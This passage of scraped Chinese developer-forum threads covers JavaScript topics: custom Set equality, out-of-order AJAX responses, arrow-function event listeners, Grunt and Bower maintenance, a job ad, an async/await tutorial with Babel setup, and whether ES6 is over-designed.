class=\"p\">([</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">],</span> <span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">])</span> <span class=\"c1\">// =&gt; true</span>\n<span class=\"nx\">A</span><span class=\"p\">(</span><span class=\"nx\">A</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">),</span> <span class=\"nx\">A</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">)).</span><span class=\"nx\">equal</span><span class=\"p\">(</span><span class=\"nx\">A</span><span class=\"p\">(</span><span class=\"nx\">A</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">),</span> <span class=\"nx\">A</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">)))</span> <span class=\"c1\">// =&gt; true</span>\n</pre></div>\n\n<p>Set 类， 和 Ruby 中的 Set 类类似。<br>\n别问我为什么不用 ES6 的 Set ， Set([1,2,3]) === Set([1,2,3]) 返回 false ，这让我怎么玩……<br>\n我的现在可以这样玩……</p>\n<div class=\"highlight\"><pre><span class=\"nx\">Set</span><span class=\"p\">([</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">]).</span><span class=\"nx\">equal</span><span class=\"p\">(</span><span class=\"nx\">Set</span><span class=\"p\">([</span><span class=\"mi\">3</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">1</span><span class=\"p\">]))</span> <span class=\"c1\">// =&gt; true</span>\n<span class=\"nx\">Set</span><span class=\"p\">([</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">]).</span><span class=\"nx\">equal</span><span class=\"p\">(</span><span class=\"nx\">Set</span><span class=\"p\">([</span><span class=\"mi\">3</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">1</span><span class=\"p\">]))</span> <span class=\"c1\">// =&gt; true</span>\n<span class=\"nx\">Set</span><span class=\"p\">([</span><span class=\"nx\">A</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">)]).</span><span class=\"nx\">equal</span><span class=\"p\">(</span><span class=\"nx\">Set</span><span class=\"p\">([</span><span class=\"nx\">A</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">)]))</span> <span class=\"c1\">// =&gt; true</span>\n</pre></div>\n\n<p>反正是玩具，不追求效率，有功能就够了。</p>\n</div></div>"], "reply": "9", "tittle": "造了一堆的轮子", "comment": ["jj 又造轮子", "jj 又造轮子", "暖贴", " ╮(╯_╰)╭\r", "\r", "反正，我就是喜欢造轮子", "知乎有个轮子哥，这里有个小轮子哥（^3^）", " \r", "\r", "╮(╯_╰)╭……\r", "轮子哥是我我们直系师兄唉……", "小荆棘准备自己开发一套语言出来吗", " \r", "\r", "嗯，作为玩具。", "target 到 js..."]},
{"content": ["<div class=\"topic_content\">设想用户在网页点击一个按钮，向后台发送一个请求，例如是想要些数据 A 显示在前台，但是时间有点久，她就点击了另外一个按钮，请求显示数据 B 。 B 很快就返回并显示。此时 A 也到了。问 A 会覆盖 B 吗？（假定想让它们在同一个 div 里显示）。如果会覆盖的话，如何才能让 A 不覆盖 B 。如果不会覆盖的话，这是什么原因。多谢！</div>"], "reply": "13", "tittle": "新手提问： js 如何处理这种情况", "comment": ["会覆盖。不想覆盖就加一个序列号，让你知道 A 和 B 是不用的。然后 div 只接受最新的序列号的内容。", "* 让你知道 A 和 B 是不同的", "用一个标识变量解决", "用添加而不是改写\r", "str+=A\r", "str+=B", " 这个序列号怎么实现？在请求里加上？然后后台返回的时候把它也带上？同时前台有个号码记录最新的序列号应该是几。如果后台返回的号比前台这个号小，就直接忽略。是这样吗？", " 能否具体说明 或者出处？多谢！", " 恩，请求要把序列号回传。", "方案 2 ：每次请求上把上一个请求 abort 掉。这样即使上一个返回了，浏览器也不要了。", "方案 3 ：这一次请求没有结束，就不要发起下一次请求。", "方案二最好。", "加遮罩层显示 loading 来阻止用户做其他操作也是一种常见的方案", "通常用户界面需要什么东西让用户知道后台有任务在跑，例如 @", " 说的加个 Loading 层。如果一次请求的数据并不是一定要显示出来，@FrankFang128 的方案 2 最好。", "补充一下，我觉得保险的话，在发新的请求的时候楼上提到的这些都是要做的：\r", "\r", "1. 尚未发送的请求，取消发送（在发送方法里检查 timestamp ）\r", "2. 已经发送正在等待返回的， abort\r", "3. 对于请求已经结束，正在处理数据的，用唯一的标识符，在数据处理完的时候拒绝过时的请求的数据\r", "4. 加 loading 屏幕\r", "\r", "如果只用其中一种或者若干种，还是有风险的，\r", "\r", "因为有时候请求数据的处理是很重的，我经常请求一个数兆的 JSON 文件，然后画到 webgl canvas 里，这时候 JSON 处理根本无法取消，三角化和 geometry 生成也很难取消，只能做多重保险。\r", "\r", "再补充一下，在 javascript 里，序列号也可以不用加在请求里，也不用服务器返回。由于 js 的回调机制，回调结束之前，那个函数的 scope 仍然是有效的，可以用局部变量和全局变量来做。\r", "\r", "我写了一个简单的例子： ", "\r", "\r", "核心的代码是这样：\r", "\r", "function sendRequest() {\r", "\tvar timestamp = (new Date()).getTime();\r", "\r", "\twindow.lastRequestTimeStamp = timestamp;\r", "\r", "\tRequest.Dispatch(params, function(result) {\r", "\t\tif (timestamp == window.lastRequestTimeStamp) {\r", "\t\t\t//do something\r", "\t\t\tconsole.log(\"success! \" + timestamp);\r", "\t\t}\r", "\t});\r", "}"]},
{"content": ["<div class=\"topic_content\"><p>直接上代码吧<br>\n<code>javascript<br>\nclass foo {<br>\n  setup(){<br>\n    document.addEventListener('click', e=&gt;this.hanlder)<br>\n  }<br>\n  hanlder(){}<br>\n}<br>\n</code><br>\n在类中使用 <code>addEventListener</code>，为了 <code>this</code> 的绑定使用了箭头函数，但是怎么 <code>removeEventListener</code>？</p>\n</div>"], "reply": "8", "tittle": "ES6 箭头函数的问题", "comment": ["没有名字就无法 remove", " 如何解决？", "给他赋个名字不就解决了....", "不怎么优雅地解决了", "箭头函数就是个匿名函数，这个就算是在 ES6 之前也是没有办法的吧", "匿名函数可以把引用赋值给变量啊，后面直接 remove 掉就行了。\r", "\r", "var h = e=>this.hanlder;\r", "\r", "document.addEventListener('click', h);\r", "\r", "document.removeEventListener('click', h);", "看标题“箭头函数”，一时还真没想起是什么。\r", "这种匿名函数，在 C#中被称为拉姆达表达式，不知道 js 里怎么称呼。", " \r", "嗯，主要是要在不同的类方法中分别调用 addEventListener 和 removeEventListener ，我将引用同时赋值给引用和 this._boundMethod['click'] 来解决了"]},
{"content": ["<div class=\"topic_content\">Bower 倒下没多久， Grunt 也开始找接盘侠 ... 给所有想参与到开源项目的同学们支一招，快去把你喜欢的用了 grunt 的 JS 项目的 task runner 换成 gulp ，晚了就来不及了。</div>"], "reply": "49", "tittle": "Grunt 也开始寻找 maintainer 了，还好 VS Code 挑对了边", "comment": ["请教 bower 是咋了...", "我得说：喜大普奔。\r", "\r", "JSer 就是喜欢造轮子…", "因为相关社区不活跃，管理者信心不足了吧", "给个相关链接吧： ", "Naive ！\r", "乃以为用 gulp 就站好队了吗？早晚还不是给 webpack 干掉~😂😂😂", "嘿嘿，于是再等几个月 gulp 也要找接盘侠了。", " bower 作者说抛弃了啊，让大家用其他的。", " 其实 webpack 也没什么后台的，这事不好说 :(", "JS 还处于混沌初开的阶段~~将来会慢慢沉淀的~~ :joy:", "更喜欢 gulp 。", "瞎搞。", "后端表示：贵圈好乱", "都是那么知名的软件，都这样不维护了。。。", "好消息是以后前端面试会少一题\r", "grunt 跟 gulp 有什么区别了", "感觉还是 gulp 用着舒服些， grunt 搞得像另一种语言了……", "gulp 对 JS 开发者更贴心,grunt 一开始完全看不懂.", "grunt 的份额最近被 gulp 干得有点惨，话说 bower 要是了那要用什么？ npm ？", " 你是说这个？ ", " EDIT: 'bower 要是用不了'", "现在不都开始用 webpack 了吗", "前端真是太乱了，轮子太多。。不过早点抛弃也好。。", " @", " @", " @", " 前端届现在一万个 star 都不保险了。而且还出现了诸如 Angular 2 直接重写的美丽故事 ... \r", "\r", " 简直是至理名言。。。\r", "\r", " webpack 确实现在更火，不过去 GitHub 上搜 gruntfile.js 你就感受到浓浓的恶意", "前端的确是够乱的", "我想说…… 楼上说 gulp 会被 webpack 替代的应该都不是前端吧……", " 哥， gulp 和 webpack 是一类东西吗？", "反正我只用过 gulp ，不管它", " 我没有说是一类东西啊？只是觉得将来会有更多 webpack 的轮子", " 抱歉，@ 错人了。", "到头来还是自己做自己用省心。", "npm script + rollup/webpack", "跟 gulp 这货没优点啊", "才刚学会 grunt", "看来我的选择是对的。", "用全套自己轮子的表示毫无压力…", " ", "刚刚把项目中的 Grunt 换成了 gulp ，估计没多久就要考虑 webpack 了吧。", "bower 早就弃用了， bower 能做的 npm 都能做， 而且做得更好，另外简单的 build 任务也可以用 npm 做", "不看好 grunt 和 gulp, makefile 才是永不过时...\r", "webpack + makefile 多简单", "看 gulp 被 make 打脸:\r", "grunt 那货本来就麻烦， gulp 效率高，上手快，不过 bower 可惜了，搞的现在 node 和前端混一块了，每次 install 一大堆东西，也是醉了，这年头只要是个前端，都能说自己熟悉 node 了", " 头像说明一切！", "bower 怎么了 找了半天没找着资料", " 而且实用 bower 的第一个步骤是  npm install -g bower", "  Bower needs resources for its maintenance. Please fill Support Declaration if you think you can help.  ", "\r", "\r", "说白了，就是自己人都不想再用这玩意了", "前端每一个星期都会发明一大堆东西出来。。。看着就累", "(´；ω；`)  谁来告诉我 Browserify + Glup 还能再战多久", "有了 npm 后， bower 就越来越鸡肋。\r", "但是。。。前两天我想把一个老项目的 bower.json 里的依赖转到 package.json 里去，结果发现一些第三方库本身没有 package.json 是不能用 npm 下载安装的，而且 bower 可以直接从 url 下载，这种 npm 也不行。。。所以还是不了了之，就先放那儿了。", " @", " \r", "或许 webpack 起初还是当 browserify 的一种替代出现的，但 loader 机制和集成的 watch 使得它可以独立存在无需与 gulp 共存，而光用 gulp 本身是干不了这事的，还是要结合 browserify/webpack 插件。\r", "它们实现的目的本身不同但功能有很多重合。前端的工作流也不一定非得是 grunt/gulp 的工作方式。\r", "webpack 感觉会是一个更宏大的前端工程方案， gulp 是轻巧的工具。将来替代并非不可能。", " 任务流管理工具  Gulp 能干的也不仅仅是捆绑压缩， loader 有自己明确地功能，要被替代的意思是 Gulp 能干的事情 webpack 都能很好的替代掉，有些事情你非得强加的用 loader 去做是很别扭的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>帮朋友找极客学院 ( <a target=\"_blank\" rel=\"nofollow\" href=\"http://www.jikexueyuan.com/\">http://www.jikexueyuan.com/</a>)  的前端、 Java 、 Android 兼职老师，在业余时间批改学生作业，作业难度一般不大，入门级别。</p>\n\n<p>大概每月 2k ~ 5k ，感兴趣的可以联系 Q: 2950040152</p>\n</div></div>"], "reply": "4", "tittle": "招聘兼职助教(前端、Java、Android)", "comment": ["原来极客学院的作业是兼职老师批改的...", "宣传的可是各大公司的技术 leader 为你改作业 233\r", " 有兼职老师，也有极客学院自己的老师。兼职老师都是需要进行预讲的，质量也是要保证的，^_^", "现在还需要的，有时间，想补贴油钱零花钱的技术人快来联系啦～！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>构建一个应用程序总是会面对异步调用，不论是在 Web 前端界面，还是 Node.js 服务端都是如此， JavaScript 里面处理异步调用一直是非常恶心的一件事情。以前只能通过回调函数，后来渐渐又演化出来很多方案，最后 Promise 以简单、易用、兼容性好取胜，但是仍然有非常多的问题。其实 JavaScript 一直想在语言层面彻底解决这个问题，在 ES6 中就已经支持原生的 Promise ，还引入了 Generator 函数，终于在 ES7 中决定支持 async 和 await 。</p>\n\n<p><img src=\"https://blog.leancloud.cn/wp-content/uploads/2015/11/async_image03.png\" alt=\"\"></p>\n\n<h2>基本语法</h2>\n\n<p>async/await 究竟是怎么解决异步调用的写法呢？简单来说，就是将异步操作用同步的写法来写。先来看下最基本的语法（ ES7 代码片段）：</p>\n\n<p><img src=\"https://blog.leancloud.cn/wp-content/uploads/2015/11/async_image08.png\" alt=\"\"></p>\n<div class=\"highlight\"><pre>const f = () =&gt; {\n  return new Promise((resolve, reject) =&gt; {\n    setTimeout(() =&gt; {\nresolve(123);\n    }, 2000);\n  });\n};\n\nconst testAsync = async () =&gt; {\n  const t = await f();\n  console.log(t);\n};\n\ntestAsync();\n</pre></div>\n\n<p>首先定义了一个函数 <code>f</code>，这个函数返回一个 Promise ，并且会延时 2 秒，<code>resolve</code> 并且传入值 123 。<code>testAsync</code> 函数在定义时使用了关键字 <code>async</code>，然后函数体中配合使用了 <code>await</code>，最后执行 <code>testAsync</code>。整个程序会在 2 秒后输出 123 ，也就是说 <code>testAsync</code> 中常量 <code>t</code> 取得了 <code>f</code> 中 <code>resolve</code> 的值，并且通过 <code>await</code> 阻塞了后面代码的执行，直到 <code>f</code> 这个异步函数执行完。</p>\n\n<h2>对比 Promise</h2>\n\n<p>仅仅是一个简单的调用，就已经能够看出来 async/await 的强大，写码时可以非常优雅地处理异步函数，彻底告别回调恶梦和无数的 <code>then</code> 方法。我们再来看下与 Promise 的对比，同样的代码，如果完全使用 Promise 会有什么问题呢？ </p>\n\n<p><img src=\"https://blog.leancloud.cn/wp-content/uploads/2015/11/async_image07.png\" alt=\"\"></p>\n<div class=\"highlight\"><pre>const f = () =&gt; {\n  return new Promise((resolve, reject) =&gt; {\n    setTimeout(() =&gt; {\n      resolve(123);\n    }, 2000);\n  });\n};\n\nconst testAsync = () =&gt; {\n  f().then((t) =&gt; {\n    console.log(t);\n  });\n};\n\ntestAsync();\n</pre></div>\n\n<p>从代码片段中不难看出 Promise 没有解决好的事情，比如要有很多的 <code>then</code> 方法，整块代码会充满 Promise 的方法，而不是业务逻辑本身，而且每一个 <code>then</code> 方法内部是一个独立的作用域，要是想共享数据，就要将部分数据暴露在最外层，在 <code>then</code> 内部赋值一次。虽然如此， Promise 对于异步操作的封装还是非常不错的，所以 <code>async/await</code> 是基于 Promise 的，<code>await</code> 后面是要接收一个 Promise 实例。</p>\n\n<h2>对比 RxJS</h2>\n\n<p>RxJS 也是非常有意思的东西，用来处理异步操作，它更能处理基于流的数据操作。举个例子，比如在 Angular2 中 http 请求返回的就是一个 RxJS 构造的 Observable Object ，我们就可以这样做：</p>\n\n<p><img src=\"https://blog.leancloud.cn/wp-content/uploads/2015/11/async_image02.png\" alt=\"\"></p>\n<div class=\"highlight\"><pre>$http.get(url)\n  .map(function(value) {\n    return value + 1;\n  })\n  .filter(function(value) {\n    return value !== null;\n  })\n  .forEach(function(value) {\n    console.log(value);\n  })\n  .subscribe(function(value) {\n    console.log('do something.');\n  }, function(err) {\n    console.log(err);\n  });\n</pre></div>\n\n<p>如果是 ES6 代码可以进一步简洁：</p>\n\n<p><img src=\"https://blog.leancloud.cn/wp-content/uploads/2015/11/async_image04.png\" alt=\"\"></p>\n<div class=\"highlight\"><pre>$http.get(url) \n  .map(value =&gt; value + 1) \n  .filter(value =&gt; value !== null) \n  .forEach(value =&gt; console.log(value)) \n  .subscribe((value) =&gt; { \n    console.log('do something.'); \n  }, (err) =&gt; { \n    console.log(err); \n  });\n</pre></div>\n\n<p>可以看出 RxJS 对于这类数据可以做一种类似流式的处理，也是非常优雅，而且 RxJS 强大之处在于你还可以对数据做取消、监听、节流等等的操作，这里不一一举例了，感兴趣的话可以去看下 RxJS 的 API 。</p>\n\n<p>这里要说明一下的就是 RxJS 和 async/await 一起用也是可以的， Observable Object 中有 <code>toPromise</code> 方法，可以返回一个 Promise Object ，同样可以结合 <code>await</code> 使用。当然你也可以只使用 async/await 配合 underscore 或者其他库，也能实现很优雅的效果。总之， RxJS 与 async/await 不冲突。</p>\n\n<h2>异常处理</h2>\n\n<p>通过使用 async/await ，我们就可以配合 try/catch 来捕获异步操作过程中的问题，包括 Promise 中 reject 的数据。 </p>\n\n<p><img src=\"https://blog.leancloud.cn/wp-content/uploads/2015/11/async_image00.png\" alt=\"\"></p>\n<div class=\"highlight\"><pre>const f = () =&gt; {\n  return new Promise((resolve, reject) =&gt; {\n    setTimeout(() =&gt; {\n      reject(234);\n    }, 2000);\n  });\n};\n\nconst testAsync = () =&gt; {\n  try {\n    const t = await f();\n    console.log(t);\n  } catch (err) {\n    console.log(err);\n  }\n};\n\ntestAsync();\n</pre></div>\n\n<p>代码片段中将 <code>f</code> 方法中的 <code>resolve</code> 改为 <code>reject</code>，在 <code>testAsync</code> 中，通过 <code>catch</code> 可以捕获到 <code>reject</code> 的数据，输出 err 的值为 234 。<code>try/catch</code> 使用时也要注意范围和层级。如果 <code>try</code> 范围内包含多个 <code>await</code>，那么 <code>catch</code> 会返回第一个 <code>reject</code> 的值或错误。</p>\n\n<p><img src=\"https://blog.leancloud.cn/wp-content/uploads/2015/11/async_image01.png\" alt=\"\"></p>\n<div class=\"highlight\"><pre>const f1 = () =&gt; {\nreturn new Promise((resolve, reject) =&gt; {\n    setTimeout(() =&gt; {\n      reject(111);\n    }, 2000);\n  });\n};\n\nconst f2 = () =&gt; {\n  return new Promise((resolve, reject) =&gt; {\n    setTimeout(() =&gt; {\n      reject(222);\n    }, 3000);\n  });\n};\n\nconst testAsync = () =&gt; {\n  try {\n    const t1 = await f1();\n    console.log(t1);\n    const t2 = await f2();\n    console.log(t2);\n  } catch (err) {\n    console.log(err);\n  }\n};\n\ntestAsync();\n</pre></div>\n\n<p>如代码片段所示，<code>testAsync</code> 函数体中 <code>try</code> 有两个 <code>await</code> 函数，而且都分别 <code>reject</code>，那么 <code>catch</code> 中仅会触发 <code>f1</code> 的 <code>reject</code>，输出的 err 值是 111 。</p>\n\n<h2>开始使用</h2>\n\n<p>无论是 Web 前端还是 Node.js 服务端，都可以通过预编译的手段实现使用 ES6 和 ES7 来写代码，目前最流行的方案是通过 <a target=\"_blank\" rel=\"nofollow\" href=\"http://babeljs.io/\">Babel</a> 将使用 ES7 、 ES6 写的代码编译为 E6 或 ES5 的代码来执行。</p>\n\n<h3>Node.js 服务端配置</h3>\n\n<p>服务端使用 Babel ，最简单的方式是通过 <code>require</code> hook 。</p>\n\n<p>首先安装 Babel ：</p>\n<div class=\"highlight\"><pre>$ npm install babel-core --save\n</pre></div>\n\n<p>安装 async/await 支持：</p>\n<div class=\"highlight\"><pre>$ npm install babel-preset-stage-3 --save\n</pre></div>\n\n<p>在服务端代码的根目录中配置 .babelrc 文件，内容为：</p>\n<div class=\"highlight\"><pre>{\n  \"presets\": [\"stage-3\"]\n}\n</pre></div>\n\n<p>在顶层代码文件（ server.js 或 app.js 等）中引入 Babel 模块：</p>\n<div class=\"highlight\"><pre>require(\"babel-core/register\");\n</pre></div>\n\n<p>在这句后面引入的模块，都将会自动通过 babel 编译，但当前文件不会被 babel 编译。另外，需要注意 Node.js 的版本，如果是 4.0 以上的版本则默认支持绝大部分 ES6 ，可以直接启动。但是如果是 0.12 左右的版本，就需要通过 <code>node — harmory</code> 来启动才能够支持。因为 stage-3 模式， Babel 不会编译基本的 ES6 代码，环境既然支持又何必要编译为 ES5 ？这样做也是为了提高性能和编译效率。</p>\n\n<h3>配置 Web 前端构建</h3>\n\n<p>可以通过增加 Gulp 的预编译 task 来支持。</p>\n\n<p>首先安装 gulp-babel 插件：</p>\n<div class=\"highlight\"><pre>$ npm install gulp-babel --save-dev\n</pre></div>\n\n<p>然后编写配置：</p>\n\n<p><img src=\"https://blog.leancloud.cn/wp-content/uploads/2015/11/async_image06.png\" alt=\"\"></p>\n<div class=\"highlight\"><pre>var gulp = require('gulp');\nvar babel = require('gulp-babel');\ngulp.task('babel', function() {\n  return gulp.src('src/app.js')\n    .pipe(babel())\n    .pipe(gulp.dest('dist'));\n});\n</pre></div>\n\n<p>除了 Gulp-babel 插件，也可以使用官方的 Babel-loader 结合 Webpack 或 Browserify 使用。</p>\n\n<p>要注意的是，虽然官方也有纯浏览器版本的 Babel.js ，但是浏览器限制非常多，而且对客户端性能影响也较大，不推荐使用。</p>\n\n<h2>LeanEngine Full Stack</h2>\n\n<p>LeanEngine （云引擎）是 <a target=\"_blank\" rel=\"nofollow\" href=\"http://leancloud.cn\">LeanCloud</a> 推出的服务器端运行环境，支持 Node.js 和 Python 环境，功能强大而且目前免费，结合 LeanCloud JavaScript SDK ，使原本复杂的开发工作变得简单高效。目前也支持 Redis 和海外节点，轻松满足你的业务需求。</p>\n\n<p><img src=\"https://blog.leancloud.cn/wp-content/uploads/2015/11/async_image05.png\" alt=\"\"><br>\nLeanCloud 使用自已的服务编写出了很多的应用和 Web 产品。为了方便各位开发者基于 LeanEngine 来开发应用， LeanCloud 整理了目前开发 Web 端产品的技术栈，并结合 LeanEngine 特点，推出了一套完整实用的技术解决方案：<a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.leancloud.cn/3729/\">LeanEngine-Full-Stack</a>，它已经配置了 Babel ，可以在 LeanEngine 中结合 JavaScript SDK 使用 async/await 处理异步操作。所以，还等什么？快来下载编写新项目吧。</p>\n\n<p>Enjoy!</p>\n\n<h2>结语</h2>\n\n<p>LeanCloud 希望能够通过构建最简单易用的技术产品，帮助各位开发者和创业者加速产品开发，尽可能地节约资源成本、时间成本和机会成本，希望本文能够帮助到你。有什么问题，可以在 <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/leancloud/LeanEngine-Full-Stack\">LeanEngine-Full-Stack @GitHub 仓库</a> 中提交 issue ，或者直接去 <a target=\"_blank\" rel=\"nofollow\" href=\"https://forum.leancloud.cn\">LeanCloud 社区</a> 提问。</p>\n\n<p>[参考资料] <a target=\"_blank\" rel=\"nofollow\" href=\"https://tc39.github.io/ecmascript-asyncawait/\">EcmaScript async/await 详细规范</a></p>\n</div></div>"], "reply": "15", "tittle": "「大概也许是」目前最好的 JavaScript 异步方案 async/await", "comment": ["消灭 callback hell ，然后消灭 then chain hell 。\r", "当我们谈论 javascript 的时候，我在各种 hell ，你却在 heaven 。", "> 从代码片段中不难看出 Promise 没有解决好的事情，比如要有很多的 then 方法，整块代码会充满 Promise 的方法，而不是业务逻辑本身，而且每一个 then 方法内部是一个独立的作用域，要是想共享数据，就要将部分数据暴露在最外层，在 then 内部赋值一次。\r", "\r", "确实如此。每次写 Promise 的时候感觉还是不太优雅。\r", "\r", "感谢楼主的分享，又学到了新知识。", "leancloud 能用来做普通的网站么？有 80 端口么？能绑定域名么？", "Rx 主要做的还是对事件流的过滤吧，感觉 subscribe 和 then 区别不是太大", "昨天刚用 async/await 重构了一个项目，不过我用的不是 Babel ，而是 TypeScript ，感觉更方便一点： ", " 其实这个问题可以看 ", " 的讨论，有几种方法还是很顺手的。", "最好的方法当然是用 PureScript 的 do-notation 。这个问题二十年前就被解决了，简单的 Continuation Monad 而已。\r", "\r", "PureScript 的特性多了去了，比如说强类型系统，比 TypeScript 的还方便。比如说 algebraic data types ，可以方便的定义枚举：\r", "data Color = Red | Green | Blue\r", "\r", "也可以定义 higher kinded types ，也就是 Swift 里枚举的那个 associated value ：\r", "data Maybe a = Just a | Nothing\r", "定义了一个 optional 的类型。\r", "\r", "方便的 pattern matching ，无论是定义简单的函数：\r", "fac :: Number -> Number\r", "fac 1 = 1\r", "fac n = fac (n - 1) * n\r", "或者处理上面的 Maybe ：\r", "nextStep :: Maybe String -> Maybe String\r", "nextStep (Just x) = performOperation x\r", "nextStep _           = Nothing\r", "\r", "当然，几乎所有的类型都可以省略：\r", "let fib 0 = 1; fib 1 = 1; fib n = fib (n-1) + fib (n-2) in fib 10\r", "\r", "类似泛型的 type class ：\r", "class ToJson a where\r", "  toJson :: a -> String\r", "\r", "然后只要针对每一种类型定义相关的函数就可以直接使用 toJson 函数了，多么模块化！当然，可以专门针对数组 [a] 针对一个 toJson 函数，只要 SomeType 定义了 toJson ，数组 [SomeType] 也就都可以用 toJson 了。\r", "\r", "还支持两个参数的 type class\r", "class Convertible a b where\r", "  convert :: a -> b\r", "\r", "然后就可以类型安全的转换数据了。\r", "\r", "担心 Maybe 穿起来特别复杂？有一串操作，每一步都可能失败？没关系，我们有 do notation\r", "operations :: Number -> Maybe Number\r", "operations x = do x1 <- op1 x; x2 <- op2 x1; x3 <- op3 x2; return x3\r", "\r", "对比原来的写法：\r", "operations x = case op1 x of\r", "  Nothing -> Nothing\r", "  Just x1 -> case op2 x1 of\r", "    Nothing -> Nothing\r", "    Just x2 -> case op3 x2 of\r", "      Nothing -> Nothing\r", "      Just x3 -> Just x3\r", "\r", "有没有感觉这个看起来很像 callback hell ？对了！这就是我说的 do notation 如何轻松的解决 callback hell ，只需要定义一个专门的 Continuation Monad 就可以用 do notation 解决 callback hell 。而且这玩意具有可扩展性，而不像楼主提到的 await async 处理的问题比较死。 Node.js 一个常见的 pattern 就是用第一个参数传 error ，而在这里稍微修改一下 Continuation Monad 的定义就可以写出：\r", "operations x = do x1 <- mayFailOp1 x; …\r", "\r", "只要其中挂了一个整个操作自动中断。\r", "\r", "Do-notation 和 monad 的各种奇技淫巧各大社区已经研究了很多年，无限的可能性。\r", "\r", "然而需要和 JSON 打交道的人可能要吐槽强类型系统的不方便，但不用担心 PureScript 原生支持 extensible records ！换句话说可以定义这样的函数：\r", "fullName :: forall t. { firstName :: String, lastName :: String | t } -> String \r", "然后任何类型！任何类型！只要包含了 firstName 和 lastName ！就可以传给 fullName ，返回的就是 String 。这个是多么方便啊！这可是有静态检查的！你只要确保项目里那几个小小的与外界打交道的函数包上了 PureScript 的皮就好了。\r", "\r", "最后再来一个重磅的， generics ，泛型编程。这可不是 Java 里的泛型，上面的 type class 已经支持那个特性了。这里的泛型是根据数据类型的形状自动生成代码。比如说，自动生成等于函数 eq ，或者 toJson 。配合起 type class 简直爽爆了，再也不用写 boilerplate/冗余代码了。\r", "\r", "然后， PureScript 的 FFI ——也就是跟普通 JavaScript 交互的接口——也是特别简单，我就不说了，具体可以自行参考 ", " 。\r", "\r", "这，才是 GHCJS 之外最好的， callback hell 解决方案。", "之前看到有个 wind.js ，觉得思路很好，但现在没再听说了\r", "\r", "整体思路就是写还是按照同步的写，但通过一个“编译器”变成异步的代码，编译器自动处理异步调用过程", "就是给 tj 的那套 co 弄个一个很甜的语法糖", "rx 不是语法糖，目的不是让你把异步写的跟同步一样。我一直觉得“把异步写的跟同步一样”没什么意义，能充分利用异步才是关键。\r", "举个例子：\r", "同时发五个请求去取一篇文章的五个章节。因为网络的原因，得到相应的顺序可能是 1,3,2,5,4 。\r", "现在要求得到 1 的时候立即把 1 渲染出来，得到 3 的时候不渲染，等到得到 2 之后再把渲染 2 和 3 一起渲染了。\r", "\r", "这种复杂的情况用 rx 就很容易实现。", " \r", "\r", "Haskell 大法好 /w\\\r", "\r", "就一个简单的 continuation 的问题嘛~", "服务端环境下用 babel 作大死啊，如果出现莫名其妙的问题，排查起来就是个灾难。", " 和那个差不多，只是上升到语法标准了， wind.js 我记得是用 eval 来做的。", "和 yield 的区别是？", "赞一个。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>好像标题党了，哈哈，好吧，我是觉得 class 没必要，箭头函数属于。。哎，可读性太差了，甚至是 let,const ，求各位拍砖，或者有同感的也发表下看法吧</p>\n</div></div>"], "reply": "21", "tittle": "有没有小伙伴觉得 ES6 是过渡设计了？", "comment": ["过渡 or 过度，少年，这是个问题啊^_^", "我也觉得语法糖太多太甜了。选择太多反而让人踌躇。\r", "可以给项目定个编码规范，不要写太花俏的代码，简单实用就好。", "不过 LZ 所说的那些没用的，我觉得有必要存在。", "。。。。。。", "作为新手，我觉得 ES6 降低了 js 编程的难度。", " 降低了不少吧", "有不是一定要用，你觉得多余，只是你没用到。", "骚年, 用 typescript 吧.. 这才是做大工程用的..", "let 和 const 挺好的吧", "CoffeeScript 表示有个牛逼的模仿者很受伤", " 编码规范的确是要点。都规范了，也不怕 写法太多", "class 必须的。。不然真的不伦不类的感觉", "好多概念从 python 借鉴的吧", "天真", "++", "不是有个说法叫做“报复性观影”么， ES6 的设计真心也属于“报复性设计”。\r", "ES3 到 ES5 的那段狗血的历史都不想再提了。", "ruby 表示 es6 还不够灵活", "我觉得有过度设计的地方，但绝不是你描述的这几个地方，你说的这几个地方还是非常有必要这么设计的", " 求指教", " 比如说箭头函数，在 JS 这个函数式很重的语言里，单行的箭头函数能很大程度上增加可读性， function 这种写多了会比较难读的，另外箭头函数是没有 this 的，就解决了 JS 里 this 绑定混乱的问题。\r", "再比如 class ，语法极大的简化，并且增强了可读性和可维护性，代码量也少了很多。\r", "另外 let 和 const 是几乎所有其它语言都有的功能吧， JS 也应该有的", "过多的箭头函数确实会降低可读性。\r", "但是 let 和 const 非常有用啊"]},
